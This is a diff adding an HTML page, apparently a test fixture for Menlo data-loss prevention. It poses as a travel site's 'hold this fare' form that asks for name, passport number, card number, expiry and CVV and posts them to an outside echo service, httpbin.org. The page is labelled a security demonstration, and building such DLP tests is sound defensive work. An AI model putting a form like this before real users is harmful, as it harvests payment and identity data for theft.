@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Hold this fare | The Deccan Wanderer</title>
+<style>
+  body{font:16px/1.5 -apple-system,Segoe UI,sans-serif;background:#f5f2ea;color:#1d2433;margin:0}
+  .box{max-width:460px;margin:50px auto;background:#fff;border-radius:14px;padding:26px 28px;box-shadow:0 4px 18px rgba(0,0,0,.08)}
+  h1{font-size:24px;margin:0 0 4px}.sub{color:#667085;font-size:14px;margin-bottom:18px}
+  label{display:block;font-weight:600;font-size:14px;margin:12px 0 4px}
+  input{width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #d0d5dd;border-radius:8px;font-size:15px}
+  .row{display:flex;gap:10px}.row>div{flex:1}
+  button{margin-top:20px;width:100%;padding:12px;border:0;border-radius:10px;background:#0f766e;color:#fff;font-weight:700;font-size:16px;cursor:pointer}
+  .note{margin-top:14px;font-size:12px;color:#98a2b3;text-align:center}
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>Hold this fare for 24 hours</h1>
+  <div class="sub">BLR → GOI · Fri 23 Oct · ₹1,899</div>
+  <!-- Posts to httpbin's echo service: if Menlo DLP does NOT block it, the data visibly arrives there. -->
+  <form method="POST" action="https://httpbin.org/post">
+    <label for="name">Full name</label><input id="name" name="name" placeholder="Full name">
+    <label for="email">Email</label><input id="email" name="email" placeholder="Email">
+    <label for="phone">Phone</label><input id="phone" name="phone" placeholder="Phone">
+    <label for="passport">Passport number</label><input id="passport" name="passport" placeholder="Passport number">
+    <label for="card">Card number</label><input id="card" name="card" placeholder="Card number" autocomplete="off">
+    <div class="row">
+      <div><label for="exp">Expiry</label><input id="exp" name="exp" placeholder="MM/YY"></div>
+      <div><label for="cvv">CVV</label><input id="cvv" name="cvv" placeholder="CVV"></div>
+    </div>
+    <button type="submit">Hold fare</button>
+  </form>
+  <div class="note">Security demonstration page. Use synthetic test data only.</div>
+</div>
+</body>
+</html>
